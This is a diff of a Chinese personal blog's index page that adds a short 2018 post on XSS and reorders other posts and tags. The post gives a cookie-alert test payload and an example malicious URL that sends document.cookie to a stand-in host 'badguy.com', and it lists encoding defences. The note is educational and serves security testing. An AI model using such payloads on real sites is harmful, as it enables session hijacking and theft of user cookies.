@@ -181,6 +181,103 @@ var _hmt = _hmt || [];
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-网络安全" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/blog/2018/06/12/网络安全/">网络安全</a>
+    </h1>
+  
+
+        
+        <a href="/blog/2018/06/12/网络安全/" class="archive-article-date">
+  	<time datetime="2018-06-11T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-06-12</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="发生场景"><a href="#发生场景" class="headerlink" title="发生场景"></a>发生场景</h2><pre><code>1. 在input标签中输入 `&quot;/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!-`,因此输入的字符被浏览器解析成js代码执行
+2. 恶意URL`http://victim.com/search.asp?term=&lt;script&gt;window.open(&quot;http://badguy.com?cookie=&quot;+document.cookie)&lt;/script&gt;`
+</code></pre><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><pre><code>1. 将用户输入的字符进行HTML Encode转码
+2. input输入框只允许输入规定的字符
+</code></pre><h2 id="测试XSS漏洞"><a href="#测试XSS漏洞" class="headerlink" title="测试XSS漏洞"></a>测试XSS漏洞</h2><pre><code>1. 在input标签中输入 `&quot;/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!-`
+2. 高版本的浏览器通常有安全机制过滤XSS, 尽量使用低版本IE浏览器
+</code></pre>
+        
+          <a class="article-more-a" href="/blog/2018/06/12/网络安全/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">网络</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">安全性测试</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/blog/categories/测试//" class="article-tag-list-link color3">测试</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/blog/2018/06/12/网络安全/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-基于python + Selenium的自动化学习(unittest)" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -550,97 +647,6 @@ var _hmt = _hmt || [];
 
 
   
-    <article id="post-HTML学习笔记(2)-背景图片" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/blog/2018/01/22/HTML学习笔记(2)-背景图片/">HTML学习笔记(2)-背景图片</a>
-    </h1>
-  
-
-        
-        <a href="/blog/2018/01/22/HTML学习笔记(2)-背景图片/" class="archive-article-date">
-  	<time datetime="2018-01-21T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-01-22</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="背景图片"><a href="#背景图片" class="headerlink" title="背景图片"></a>背景图片</h2><h3 id="背景颜色"><a href="#背景颜色" class="headerlink" title="背景颜色"></a>背景颜色</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">background-color: red;</span><br><span class="line">background-color: #fff;</span><br><span class="line">background-color: rgba(0,0,0,.5);</span><br></pre></td></tr></table></figure>
-        
-          <a class="article-more-a" href="/blog/2018/01/22/HTML学习笔记(2)-背景图片/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">前端</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">html</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/blog/categories/前端//" class="article-tag-list-link color3">前端</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/blog/2018/01/22/HTML学习笔记(2)-背景图片/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
     <article id="post-HTML学习笔记(1)-外边距合并" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -703,6 +709,97 @@ var _hmt = _hmt || [];
       
         <p class="article-more-link">
           <a class="article-more-a" href="/blog/2018/01/22/HTML学习笔记(1)-外边距合并/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-HTML学习笔记(2)-背景图片" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/blog/2018/01/22/HTML学习笔记(2)-背景图片/">HTML学习笔记(2)-背景图片</a>
+    </h1>
+  
+
+        
+        <a href="/blog/2018/01/22/HTML学习笔记(2)-背景图片/" class="archive-article-date">
+  	<time datetime="2018-01-21T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-01-22</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="背景图片"><a href="#背景图片" class="headerlink" title="背景图片"></a>背景图片</h2><h3 id="背景颜色"><a href="#背景颜色" class="headerlink" title="背景颜色"></a>背景颜色</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">background-color: red;</span><br><span class="line">background-color: #fff;</span><br><span class="line">background-color: rgba(0,0,0,.5);</span><br></pre></td></tr></table></figure>
+        
+          <a class="article-more-a" href="/blog/2018/01/22/HTML学习笔记(2)-背景图片/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">前端</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">html</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/blog/categories/前端//" class="article-tag-list-link color3">前端</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/blog/2018/01/22/HTML学习笔记(2)-背景图片/">展开全文 >></a>
         </p>
       
 
@@ -853,10 +950,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">正则</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">OSI</a>
               </li>
              
@@ -865,11 +958,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">urllib</a>
+                <a href="javascript:void(0)" class="js-tag color3">正则</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">git</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">requests</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">urllib</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -881,15 +982,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">电影</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">网络</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">安全性测试</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">电影</a>
               </li>
             
             <div class="clearfix"></div>
